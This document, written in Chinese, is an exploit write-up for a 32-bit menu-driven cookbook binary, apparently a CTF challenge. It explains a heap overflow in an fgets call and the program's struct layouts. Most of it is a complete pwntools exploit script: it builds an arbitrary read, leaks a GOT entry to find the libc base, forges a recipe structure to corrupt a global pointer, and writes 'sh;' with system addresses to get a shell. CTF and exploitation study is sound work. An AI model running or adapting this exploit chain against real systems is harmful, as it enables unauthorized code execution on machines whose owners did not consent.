# 漏洞利用文档

## 执行环境
基于提供的反编译代码和exp分析，程序运行环境如下：
- **二进制类型**：ELF 32位可执行文件，使用动态链接库
- **安全特性**（通过checksec推断）：
  - 可能启用NX（堆栈不可执行）
  - 可能启用ASLR（exp使用LibcSearcher应对ASLR）
  - 部分RELRO（GOT表可写）
- **依赖库**：标准C库（libc），通过ldd命令显示依赖libc.so.6
- **运行需求**：需要交互式输入，支持菜单驱动操作

## 漏洞成因
### 关键结构体分析
1. **食材结构体**（0x90字节）：
   - 偏移0: 热量值（4字节）
   - 偏移4: 价格（4字节）
   - 偏移8: 名称（128字节）
   - 偏移136: 自引用指针（4字节）

2. **食谱结构体**（0x40C字节）：
   - 偏移0: 食材列表指针（4字节）
   - 偏移4: 数量列表指针（4字节）
   - 偏移8: 名称（132字节）
   - 偏移140: 指令（896字节）
   - 偏移1036: 类型指针（4字节）

### 漏洞分析
**漏洞类型**：堆溢出（Heap Overflow）

**漏洞位置**：在`sub_8049092()`函数的`'g'`（给食谱命名）和`'i'`（包含指令）选项中：
```c
fgets((char *)dword_804D0A0 + 140, 1036, stdin);
```
- `dword_804D0A0`通过`calloc(1u, 0x40Cu)`分配1036字节
- `fgets`读取1036字节写入偏移140处，实际写入范围140+1036=1176字节
- 超出分配大小1036字节，导致140字节堆溢出

**漏洞触发**：溢出覆盖相邻堆块的元数据或关键指针，结合程序逻辑实现任意地址读写。

## 漏洞利用过程
### 内存变化时序分析

| 步骤 | 操作 | 堆内存变化 | 关键指针状态 |
|------|------|------------|--------------|
| 1 | 设置用户名"MYNAME" | 分配0x40字节chunk存储用户名 | dword_804D0AC指向用户名chunk |
| 2 | 进入主菜单 | 堆布局稳定，无新分配 | 所有全局指针初始化为有效地址 |
| 3 | 读取配料列表指针 | 通过烹饪书名称功能泄露堆地址 | INGR_LIST = 0x83c3050（配料链表头） |
| 4 | 读取fgets的GOT地址 | 利用堆溢出泄露GOT条目 | fgets@got.plt = 0xf7d99160 |
| 5 | 计算libc地址并执行corrupt_curr_recipe_ptr | 覆盖当前食谱指针和配料指针 | CURR_INGR被覆盖为伪造结构地址 |
| 6 | 触发system("sh") | 进程替换为/bin/dash | 原始程序内存映射被替换 |

### 关键内存破坏点
在`corrupt_curr_recipe_ptr`函数中：
1. **伪造食谱结构**：通过设置烹饪书名称创建伪造的食谱结构
2. **指针覆盖**：溢出覆盖`CURR_INGR`指针，使其指向伪造结构
3. **命令注入**：在食材名称中写入"sh;"命令字符串
4. **GOT劫持**：最终覆盖函数指针指向system地址

## Exploit
```python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./data/sample5')
p = process('./data/sample5')
libc = elf.libc
system_off = libc.symbols['system']
fgets_off = libc.symbols['fgets']

# 关键全局变量地址
RECIPE_LEN = 0x40c
CURR_INGR = 0x0804d09c
INGR_LIST = 0x0804d094
FGETS_GOT = 0x0804d020

def sl(l):
    p.sendline(l)

def main_menu():
    p.readuntil('[R]emove cookbook name\n[q]uit\n')

def recipe_menu():
    p.readuntil('[p]rint current recipe\n[q]uit\n')

def ingr_menu():
    p.readuntil("[q]uit (doesn't save)?\n[e]xport saving changes (doesn't quit)?\n")

def read_addr(addr):
    """利用堆溢出实现任意地址读取"""
    sl('c')  # 进入食谱菜单
    recipe_menu()
    sl('n')  # 新建食谱
    recipe_menu()
    sl('d')  # 丢弃食谱（触发堆操作）
    recipe_menu()
    sl('q')  # 退出食谱菜单
    main_menu()
    sl('g')  # 设置烹饪书名称
    p.readuntil("(hex because you're both a chef and a hacker!) : ")
    sl('{:x}'.format(RECIPE_LEN))
    # 构造payload：填充数据+目标地址
    sl(b'\x00'*8 + b'A'*(0x7c-8) + p32(addr))
    p.readuntil('the new name of the cookbook is')
    main_menu()
    sl('c')  # 再次进入食谱菜单
    recipe_menu()
    sl('p')  # 打印食谱（泄露数据）
    p.readuntil('recipe type: ')
    leak = p.readuntil('total cost :')
    ret = leak[:-(len('total cost :')+2)]
    recipe_menu()
    sl('q')
    main_menu()
    sl('R')  # 移除烹饪书名称
    main_menu()
    return ret

def read_ptr(addr):
    """读取32位指针值"""
    data = b''
    while len(data) < 4:
        last_read = read_addr(addr)
        if len(last_read) == 0:
            data += b'\x00'
        else:
            data += last_read
    return u32(data[:4])

def corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr):
    """核心漏洞利用函数：覆盖当前食谱指针"""
    sl('a')  # 进入食材菜单
    ingr_menu()
    sl('n')  # 新建食材
    ingr_menu()
    sl('s')  # 设置热量
    sl('0')
    ingr_menu()
    sl('p')  # 设置价格（用于伪造指针）
    sl('{}'.format(u32(p32(0x804cff8))))  # 写入特定值作为标记
    ingr_menu()
    sl('q')  # 退出食材菜单
    main_menu()
    sl('c')  # 进入食谱菜单
    recipe_menu()
    sl('n')  # 新建食谱
    recipe_menu()
    sl('d')  # 丢弃食谱（制造堆布局）
    recipe_menu()
    sl('q')
    main_menu()
    sl('g')  # 设置烹饪书名称（触发堆溢出）
    p.readuntil("(hex because you're both a chef and a hacker!) : ")
    sl('{:x}'.format(0x40c))
    # 构造伪造的食谱结构：配料列表指针 + 当前食材指针-4
    fake_recipe = p32(ingr_list_ptr) + p32(CURR_INGR-4)
    sl(fake_recipe)  # 溢出覆盖关键指针
    p.readuntil('the new name of the cookbook is')
    main_menu()
    sl('c')  # 进入食谱菜单
    recipe_menu()
    sl('r')  # 移除食材（触发指针解引用）
    p.readuntil('which ingredient to remove? ')
    sl('tomato\x00')  # 触发特定食材移除操作
    recipe_menu()
    sl('q')
    main_menu()
    sl('a')  # 再次进入食材菜单
    ingr_menu()
    sl('g')  # 给食材命名（写入命令和system地址）
    # 构造payload："sh;" + 填充 + system地址数组
    sl(b'sh; \x00\x00\x00\x00' + p32(system_addr)*32)

# 主利用流程
p.readuntil(b'what\'s your name?\n')
p.sendline(b'MYNAME')  # Step 1: 设置用户名
main_menu()  # Step 2: 进入主菜单

# Step 3: 泄露配料列表指针
ingr_list_ptr = read_ptr(INGR_LIST)

# Step 4: 泄露fgets的GOT地址计算libc基址
fgets_addr = read_ptr(FGETS_GOT)

# Step 5: 计算system地址并执行核心利用
libc_addr = fgets_addr - fgets_off
system_addr = libc_addr + system_off
corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr)

# Step 6: 获得shell
p.interactive()
```

### 关键注释说明
1. **任意地址读取**：`read_addr`函数利用堆溢出泄露内存数据，通过设置烹饪书名称时的缓冲区溢出实现信息泄露。
2. **指针泄露**：`read_ptr`函数通过多次读取组装完整的32位指针值，应对可能的字节对齐问题。
3. **核心利用**：`corrupt_curr_recipe_ptr`函数：
   - 通过食材价格设置伪造指针标记
   - 利用烹饪书名称的堆溢出覆盖`CURR_INGR`指针
   - 在食材名称中注入"sh;"命令和system地址数组
   - 通过移除食材操作触发指针解引用，最终执行system("sh")

该exp成功利用了堆溢出漏洞，通过精确的堆布局操作实现了从信息泄露到代码执行的完整利用链。
